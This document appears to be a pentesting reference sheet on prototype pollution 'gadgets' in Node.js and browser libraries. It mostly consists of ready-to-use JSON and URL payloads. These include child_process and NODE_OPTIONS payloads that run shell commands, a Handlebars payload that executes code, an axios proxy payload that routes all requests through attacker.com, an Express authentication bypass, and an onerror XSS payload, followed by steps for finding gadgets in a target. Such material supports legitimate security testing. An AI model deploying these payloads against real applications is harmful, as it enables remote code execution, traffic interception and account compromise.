# Prototype Pollution Gadgets

Pollution alone is not exploitation. A GADGET is code that reads from the polluted property and does something dangerous. Here are known gadgets by framework/library.

## Server-Side (Node.js) Gadgets

### child_process Gadgets (RCE)

**shell option:** If `child_process.exec()` or `spawn()` is called without explicit `shell` option, it defaults to reading from prototype:
```javascript
// Vulnerable pattern:
child_process.spawn("ls", ["-la"]);
// If Object.prototype.shell was polluted, spawn uses polluted shell
```

**Pollution payload:**
```json
{"__proto__": {"shell": "sh", "argv0": "-c", "cmd": "evil_command"}}
// Or:
{"__proto__": {"NODE_OPTIONS": "--experimental-loader data:text/javascript,import('child_process').then(cp=>cp.execSync('id'))"}}
```

### Template Engine Gadgets

**Handlebars:**
```json
{"__proto__": {"lookupProperty": "function() { return arguments[1].constructor('return process')().mainModule.require('child_process').execSync('id') }"}}
```

**Pug:** Template compilation reads prototype for options.

### HTTP Request Options

**axios / request:** Default options read from prototype:
```json
{"__proto__": {"proxy": {"host": "attacker.com", "port": 8080}}}
// All HTTP requests now route through attacker's proxy
```

### Express.js Specific

**Middleware options:**
```json
{"__proto__": {"isAuthenticated": true}}
// If middleware uses req.isAuthenticated() which falls through to prototype → auth bypass
```

## Client-Side Gadgets

### DOM XSS via Attribute Sinks

```javascript
// Library code:
element.setAttribute(config.attr || 'src', userInput);
// If config.attr is polluted to 'onerror' and userInput contains alert(1):
// element becomes <img onerror="alert(1)">
```

**Pollution:**
```
URL: ?__proto__[src]=x&__proto__[onerror]=alert(1)
```

### jQuery Gadgets

jQuery's `$.extend(true, ...)` with deep merge was vulnerable (fixed in 3.4.0). `$.html()` on polluted object.

### Bootstrap Gadgets

Bootstrap tooltip/popover config reads from options object. Polluting template option → XSS.

### Lodash Gadgets

`_.template()` with polluted template option → XSS/RCE.

## Universal Gadget Patterns

### Options Object Fallthrough
```javascript
function render(userData, options = {}) {
  const template = options.template || '<div>{{content}}</div>';
  // If options is a new object, options.template falls through to Object.prototype.template
}
```

### Default Parameter Pollution
```javascript
function saveUser(userData = {}) {
  const role = userData.role || 'user';
  // If userData is merged from polluted input, role may be inherited
}
```

### Function Argument Defaults
```javascript
function query(selector, options) {
  options = options || {};
  const method = options.method; // Reads prototype chain
}
```

## Finding Gadgets in the Target

1. **Check dependencies:** `package.json` reveals the libraries used. Research known gadgets for each.
2. **Source maps:** If available, search application code for patterns like `config.X || default`, `options.X`, `user.X` where X is the polluted property.
3. **Global property access:** Look for `this.propertyName` or `instance.propertyName` reads.
4. **Framework internals:** Each framework has well-known prototype pollution sinks.

## Gadget Research Tools

- `ppmap`: Tests common client-side gadgets automatically
- `proto-pollution`: Node.js gadget catalog
- Research papers: "Silent Spring" and "Server-side prototype pollution: Black-box detection without the DoS"
